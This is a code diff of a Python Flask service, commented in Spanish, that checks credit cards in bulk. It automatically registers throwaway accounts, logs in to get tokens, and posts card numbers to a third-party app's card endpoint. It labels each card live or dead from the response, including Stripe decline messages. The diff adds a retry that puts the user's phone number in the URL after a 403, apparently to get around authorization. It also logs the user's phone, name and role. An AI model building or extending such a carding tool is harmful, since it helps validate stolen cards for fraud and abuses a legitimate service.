@@ -137,7 +137,7 @@ def mask_token(token: str) -> str:
 
 
 def mask_card(card: str) -> str:
-    # card format: cc|mm|yy|cvv
+    # card format: cc|mm|yy
     try:
         parts = card.split("|")
         cc = parts[0]
@@ -213,7 +213,10 @@ def login_usuario(email):
             "elapsed_seconds": elapsed,
             "response_body": r.text[:2000],
             "token_detectado": False,
-            "token": None
+            "token": None,
+            "telefono": None,
+            "nombre": None,
+            "rol": None
         }
 
         if r.status_code in (200, 201):
@@ -225,8 +228,12 @@ def login_usuario(email):
                     or (data.get("data") or {}).get("token")
                 )
                 resultado["token_detectado"] = bool(token)
-                resultado["token"] = token  # ASEGURAR que se devuelve el token
+                resultado["token"] = token
+                resultado["telefono"] = data.get("telefono")
+                resultado["nombre"] = data.get("nombre")
+                resultado["rol"] = data.get("rol")
                 logger.debug("Token detectado: %s", mask_token(token) if token else "None")
+                logger.debug("Datos usuario: telefono=%s, nombre=%s, rol=%s", resultado["telefono"], resultado["nombre"], resultado["rol"])
             except Exception as e:
                 logger.exception("Error parseando JSON de login: %s", e)
         return resultado
@@ -245,15 +252,22 @@ def login_usuario(email):
 # ============================================================
 def procesar_tarjeta(card: str) -> dict:
     """
-    card expected format: 'cc|mm|yy|cvv'
+    card expected format: 'cc|mm|yy'
     Returns a dict with status: live / dead / error and raw response details.
     """
     logger.info("Procesando tarjeta: %s", mask_card(card))
     try:
-        cc, mm, yy, cvv = card.split("|")
+        parts = card.split("|")
+        if len(parts) == 3:
+            cc, mm, yy = parts
+        elif len(parts) == 4:
+            # Si viene con CVV, ignorarlo
+            cc, mm, yy, _ = parts
+        else:
+            raise ValueError(f"Formato incorrecto: {len(parts)} partes")
     except Exception:
         logger.warning("Formato de tarjeta inválido: %s", card)
-        return {"status": "error", "message": "Formato inválido. Usa: cc|mm|yy|cvv", "card": card}
+        return {"status": "error", "message": "Formato inválido. Usa: cc|mm|yy", "card": card}
 
     # Registrar usuario hasta exito
     email, registro_info = registrar_usuario_hasta_exito()
@@ -267,12 +281,13 @@ def procesar_tarjeta(card: str) -> dict:
         logger.error("Login fallido para %s: %s", email, login)
         return {"status": "error", "message": "Login fallido", "card": card, "login": login}
 
-    token = login.get("token")  # Obtener el token
-    logger.debug("Token obtenido en procesar_tarjeta: %s", mask_token(token) if token else "None")
+    token = login.get("token")
+    telefono = login.get("telefono")
+    logger.debug("Token obtenido: %s, Teléfono: %s", mask_token(token) if token else "None", telefono)
     
     headers = API_HEADERS.copy()
 
-    # Construir Authorization de forma razonable:
+    # Construir Authorization
     if token:
         if isinstance(token, str) and token.lower().startswith("bearer "):
             headers["Authorization"] = token
@@ -282,6 +297,7 @@ def procesar_tarjeta(card: str) -> dict:
     else:
         logger.warning("Token es None, continuando sin autorización")
 
+    # INTENTO 1: Enviar a /api/app/conductor/tarjetas (sin ID)
     payload = {"numero": cc, "expiracionMes": mm, "expiracionYear": yy}
     logger.debug("Enviando solicitud de tarjeta para %s (email=%s)", mask_card(card), email)
 
@@ -300,9 +316,21 @@ def procesar_tarjeta(card: str) -> dict:
         logger.info("Respuesta CARD %s %s", r.status_code, CARD_URL)
         logger.debug("CARD response body: %s", r.text[:1000])
 
+        # Si es 403 y tenemos teléfono, intentar con teléfono en la URL
+        if r.status_code == 403 and telefono:
+            logger.warning("Recibido 403, intentando con teléfono en URL: %s", telefono)
+            card_url_with_phone = f"{CARD_URL.rstrip('/')}/{telefono}"
+            try:
+                r = c.post(card_url_with_phone, json=payload, headers=headers, timeout=30)
+                logger.info("Reintento con teléfono: Respuesta CARD %s %s", r.status_code, card_url_with_phone)
+                logger.debug("Reintento CARD response body: %s", r.text[:1000])
+                raw_response["reintento_url"] = card_url_with_phone
+            except Exception as e:
+                logger.exception("Error en reintento con teléfono: %s", e)
+
         source = r.text.lower() if r.text else ""
 
-        # Interpretación básica similar al primer archivo
+        # Interpretación de respuesta
         if r.status_code == 200:
             logger.info("Tarjeta LIVE detectada: %s", mask_card(card))
             return {
@@ -312,7 +340,7 @@ def procesar_tarjeta(card: str) -> dict:
                 "raw": raw_response
             }
 
-        if r.status_code == 500 or "stripe" in source or "card_declined" in source:
+        if r.status_code == 500 or "stripe" in source or "card_declined" in source or "declined" in source:
             logger.info("Tarjeta DEAD/declinada: %s", mask_card(card))
             return {
                 "status": "dead",
@@ -353,7 +381,7 @@ def home():
             "GET /diagnostico": "Verificar proxy",
             "GET /diagnostico/proxy-detalle": "Diagnóstico detallado",
             "POST /diagnostico/flujo": "Probar registro y login",
-            "POST /check": "Verificar una tarjeta (payload: { 'card': 'cc|mm|yy|cvv' })",
+            "POST /check": "Verificar una tarjeta (payload: { 'card': 'cc|mm|yy' })",
             "POST /check/bulk": "Verificar múltiples tarjetas (payload: { 'cards': [...] })"
         }
     })
@@ -495,7 +523,10 @@ def diagnostico_flujo():
         "status_code": login["status_code"],
         "elapsed_seconds": login["elapsed_seconds"],
         "token_detectado": login.get("token_detectado", False),
-        "token": login.get("token")  # Incluir token en la traza
+        "token": login.get("token"),
+        "telefono": login.get("telefono"),
+        "nombre": login.get("nombre"),
+        "rol": login.get("rol")
     })
 
     return jsonify({
